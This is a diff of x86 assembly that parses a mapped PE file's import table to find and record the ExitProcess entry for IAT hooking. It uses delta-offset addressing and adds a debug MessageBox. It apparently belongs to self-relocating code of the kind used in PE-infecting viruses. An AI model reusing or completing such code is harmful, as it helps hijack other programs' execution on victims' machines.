@@ -1,10 +1,11 @@
 ; IAT Hooking (ExitProcess)
-mov	[DELTA VAExitProcess], 0
+mov	[DELTA VAKernelIAT], 0
 ; Check if valid
 cmp	[DELTA OffsetIAT], 0
 je	doNotHook
 ; Get IAT
 mov	edi, ebx ; VA IAT
+mov	[DELTA VAIAT], ebx
 mov	eax, [DELTA OffsetIAT]
 sub	edi, eax
 mov	eax, [DELTA PeFileMap]
@@ -47,7 +48,7 @@ mov	eax, [DELTA PeFileMap]
 add	ebx, eax
 mov	eax, [DELTA OffsetIAT]
 sub	ebx, eax
-add	ebx, 2 ; TODO - WHY !?
+add	ebx, 2 ; TODO - WHY !? (Cardinal:Hint)
 ; Check if we found ExitProcess
 push	edx
 push	ecx
@@ -60,25 +61,26 @@ pop	edx
 cmp	eax, 0
 jne	nextIterateFunc
 
+pusha
+push	0
+push	ebx
+push	ebx
+push	0
+call	[DELTA pMessageBox]
+popa
+
 ; We found it ! Get VA
 ; Get Array of VA
-mov	edx, edi
-; add	edx, 010h
-mov	edx, [edx]
-mov	eax, [DELTA PeFileMap]
-add	edx, eax
-mov	eax, [DELTA OffsetIAT]
-sub	edx, eax
-; Go to index
+mov	edx, [DELTA VAIAT]
+add	edx, 010h
+mov	[DELTA VAKernelIAT], edx
+; Store offset index
 mov	eax, esi
 mov	ecx, 4
-push	edx
 mul	ecx
-pop	edx
 add	edx, eax
-mov	edx, [edx]
-; Store VA
-mov	[DELTA VAExitProcess], edx
+mov	[DELTA OffsetExitProcess], edx
+; Get out
 jmp	doNotHook
 
 nextIterateFunc:
@@ -88,6 +90,9 @@ jmp	iterateFunc
 endIterateFunc:
 
 add	edi, sizeof (IMAGE_IMPORT_DESCRIPTOR)
+mov	eax, [DELTA VAIAT]
+add	eax, sizeof (IMAGE_IMPORT_DESCRIPTOR)
+mov	[DELTA VAIAT], eax
 jmp	iterateIAT
 doNotHook:
 pop	esi
